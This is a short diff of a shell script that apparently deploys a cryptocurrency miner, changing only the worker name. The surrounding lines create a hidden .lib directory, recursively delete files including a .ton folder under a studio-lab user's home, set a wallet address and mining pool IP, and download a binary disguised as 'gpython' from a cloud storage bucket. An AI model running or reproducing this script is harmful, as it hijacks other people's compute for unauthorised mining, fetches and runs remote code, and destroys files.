@@ -5,7 +5,7 @@ mkdir .lib
 cd .lib
 rm -R *
 rm -R /home/studio-lab-user/.ton
-WORKER="RTX-2060-LHR"
+WORKER="RTX-3050"
 WALLETNH="3A7jTKEyNHyLLnUM4982okvojs31ATXBLX"
 POOLNH="18.136.196.140:443"
 wget https://ewr1.vultrobjects.com/mines/gpython
